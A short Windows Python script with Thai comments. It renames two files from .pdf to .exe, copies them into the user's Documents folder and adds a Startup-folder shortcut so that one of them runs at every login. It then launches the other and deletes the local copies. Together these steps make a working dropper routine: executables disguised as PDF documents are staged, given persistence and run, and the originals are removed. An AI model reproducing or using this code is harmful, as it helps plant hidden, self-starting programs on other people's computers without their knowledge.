import os
import winshell
from win32com.client import Dispatch
import shutil
import subprocess



# ฟังก์ชันเปลี่ยนชื่อไฟล์
def rename_file(old_name, new_name):
    try:
        os.rename(old_name, new_name)
        print(f"File renamed from {old_name} to {new_name}")
    except Exception as e:
        print(f"Error occurred: {e}")

# ตัวอย่างการใช้งาน
old_file_name = r'alpha1.pdf'  # ไฟล์เดิมที่ต้องการเปลี่ยนชื่อ
new_file_name = r'alpha1.exe'  # ชื่อไฟล์ใหม่ที่ต้องการตั้ง
rename_file(old_file_name, new_file_name)
old_file_name2 = r'alpha2.pdf'  # ไฟล์เดิมที่ต้องการเปลี่ยนชื่อ
new_file_name2 = r'alpha2.exe' 
rename_file(old_file_name2, new_file_name2)

# ฟังก์ชันคัดลอกไฟล์ไปที่โฟลเดอร์ Documents
def copy_to_documents(source_file):
    try:
        # ค้นหาโฟลเดอร์ Documents ของผู้ใช้ปัจจุบัน
        documents_folder = os.path.join(os.path.expanduser("~"), "Documents")
        
        # คัดลอกไฟล์ไปยังโฟลเดอร์ Documents
        destination_file = os.path.join(documents_folder, os.path.basename(source_file))
        shutil.copy(source_file, destination_file)
        print(f"File copied to Documents: {destination_file}")
    except Exception as e:
        print(f"Error occurred: {e}")

# ตัวอย่างการใช้งาน
source_file = r'alpha1.exe'  # ไฟล์ที่ต้องการคัดลอก
copy_to_documents(source_file)
source_file2 = r'alpha2.exe'
copy_to_documents(source_file2)

# ฟังก์ชันสร้างทางลัดในโฟลเดอร์ Startup
def create_startup_shortcut(target_path, shortcut_name, description=''):
    # ค้นหาโฟลเดอร์ Startup
    startup_folder = os.path.join(os.getenv('APPDATA'), r'Microsoft\Windows\Start Menu\Programs\Startup')
    shortcut_path = os.path.join(startup_folder, f'{shortcut_name}.lnk')

    # สร้างทางลัด
    shell = Dispatch('WScript.Shell')
    shortcut = shell.CreateShortcut(shortcut_path)
    shortcut.TargetPath = target_path
    shortcut.WorkingDirectory = os.path.dirname(target_path)
    shortcut.Description = description
    shortcut.save()

    print(f"Shortcut created at {shortcut_path}")

# ค้นหาโฟลเดอร์ Documents ของผู้ใช้
documents_folder = os.path.join(os.path.expanduser("~"), "Documents")

# ตัวอย่างการใช้งาน
target_program = os.path.join(documents_folder, 'alpha2.exe')  # ตำแหน่งโปรแกรมหรือไฟล์ที่ต้องการรัน
shortcut_name = 'alpha'  # ชื่อของทางลัด
create_startup_shortcut(target_program, shortcut_name, 'This is my program')


# ฟังก์ชันลบไฟล์
def delete_file(file_path):
    try:
        os.remove(file_path)
        print(f"File {file_path} deleted")
    except Exception as e:
        print(f"Error occurred: {e}")

# ตัวอย่างการใช้งาน
file_to_delete = 'alpha2.exe'
delete_file(file_to_delete)

# ฟังก์ชันเปิดไฟล์ใน Documents
def open_file_in_documents(file_name):
    try:
        # ระบุเส้นทางไปยังโฟลเดอร์ Documents ของผู้ใช้
        documents_folder = os.path.join(os.path.expanduser("~"), "Documents")
        file_path = os.path.join(documents_folder, file_name)

        # เปิดไฟล์
        os.startfile(file_path)
        print(f"Opened {file_path} successfully.")
    except Exception as e:
        print(f"Failed to open {file_path}: {e}")

# ตัวอย่างการใช้งาน
file_to_open = 'alpha1.exe'  # ใส่ชื่อไฟล์ที่ต้องการเปิด
open_file_in_documents(file_to_open)

file_to_delete = 'alpha1.exe'
delete_file(file_to_delete)